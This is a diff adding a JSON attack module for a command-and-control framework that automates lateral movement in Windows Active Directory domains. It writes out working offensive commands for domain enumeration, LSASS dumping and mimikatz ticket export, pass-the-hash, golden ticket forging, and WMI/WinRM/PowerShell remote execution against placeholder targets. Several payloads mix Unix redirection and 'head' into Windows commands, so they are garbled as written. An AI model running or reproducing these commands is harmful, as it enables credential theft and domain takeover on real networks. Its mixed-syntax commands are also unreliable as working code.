@@ -1,0 +1,86 @@
+{
+  "id": "automated_lateral_movement",
+  "name": "AI-Driven Lateral Movement Automation",
+  "description": "Automated lateral movement with intelligent target selection, credential relaying, pass-the-hash, golden ticket generation, and cross-domain pivoting for enterprise environments",
+  "version": "2.0",
+  "author": "SecureComm C2 - LateralOps",
+  "category": "lateral-movement",
+  "platform": "windows",
+  "risk_level": "critical",
+  "requires_admin": true,
+  "commands": [
+    {
+      "type": "exec",
+      "payload": "net view /all 2>/dev/null | head -20; nltest /dclist:$(echo %USERDOMAIN%) 2>/dev/null; nltest /dsgetdc:$(echo %USERDOMAIN%) /server 2>/dev/null; Get-ADComputer -Filter * -Properties Name,IPv4Address,OperatingSystem 2>/dev/null | Select-Object Name,IPv4Address,OperatingSystem | head -15",
+      "description": "Active Directory and network host discovery",
+      "timeout": 90,
+      "lateral_technique": "ad_enumeration"
+    },
+    {
+      "type": "exec",
+      "payload": "klist sessions 2>/dev/null; cmdkey /list 2>/dev/null; mimikatz.exe sekurlsa::tickets /export 2>/dev/null || procdump.exe -accepteula -ma lsass.exe lsass.dmp 2>/dev/null && echo 'LSASS dumped for offline analysis'",
+      "description": "Credential and Kerberos ticket extraction for lateral movement",
+      "timeout": 120,
+      "lateral_technique": "credential_extraction"
+    },
+    {
+      "type": "exec",
+      "payload": "mimikatz.exe sekurlsa::pth /user:administrator /domain:$(echo %USERDOMAIN%) /ntlm:HASH 2>/dev/null; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami' -ComputerName TARGET 2>/dev/null; winrs -r:TARGET -u:DOMAIN\\USER -p:PASS cmd /c whoami 2>/dev/null",
+      "description": "Pass-the-hash and remote execution validation",
+      "timeout": 90,
+      "lateral_technique": "pass_the_hash"
+    },
+    {
+      "type": "exec",
+      "payload": "mimikatz.exe kerberos::golden /user:Administrator /domain:$(echo %USERDOMAIN%) /sid:S-1-5-21-XXX /krbtgt:HASH /id:500 /groups:512 /ptt 2>/dev/null; klist 2>/dev/null | head -20; dir \\\\$(echo %USERDNSDOMAIN%)\\SYSVOL 2>/dev/null",
+      "description": "Golden ticket generation and domain admin validation",
+      "timeout": 60,
+      "lateral_technique": "golden_ticket"
+    },
+    {
+      "type": "exec",
+      "payload": "Enter-PSSession -ComputerName TARGET 2>/dev/null; Test-WSMan TARGET 2>/dev/null; Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } 2>/dev/null; New-PSSession -ComputerName TARGET 2>/dev/null | Enter-PSSession",
+      "description": "PowerShell Remoting validation and session establishment",
+      "timeout": 90,
+      "lateral_technique": "ps_remoting"
+    },
+    {
+      "type": "exec",
+      "payload": "netsh advfirewall firewall show rule name=all | findstr 'Dir.*In.*Action.*Allow' | head -20; netstat -an | findstr '135|445|5985|5986|3389'; Test-NetConnection -ComputerName TARGET -Port 445 2>/dev/null",
+      "description": "Firewall and network port validation for lateral movement paths",
+      "timeout": 60,
+      "lateral_technique": "network_path_validation"
+    }
+  ],
+  "lateral_movement_methods": [
+    "wmi_exec",
+    "smb_pipe",
+    "ps_remoting",
+    "scheduled_task",
+    "service_creation",
+    "dccom_lateral",
+    "rdp_shadowing"
+  ],
+  "credential_techniques": {
+    "pass_the_hash": true,
+    "pass_the_ticket": true,
+    "over_pass_the_hash": true,
+    "golden_ticket": true,
+    "silver_ticket": true,
+    "dcsync": true
+  },
+  "ai_target_selection": {
+    "enabled": true,
+    "criteria": [
+      "domain_admin_sessions",
+      "high_value_targets",
+      "weak_authentication",
+      "exposed_services"
+    ]
+  },
+  "mitre_techniques": ["T1021", "T1550", "T1558", "T1071", "T1098"],
+  "tags": ["lateral-movement", "ad", "kerberos", "pass-the-hash", "golden-ticket", "enterprise", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "demonstration_notes": "Advanced enterprise lateral movement automation with AI-driven target selection and multiple credential techniques"
+}
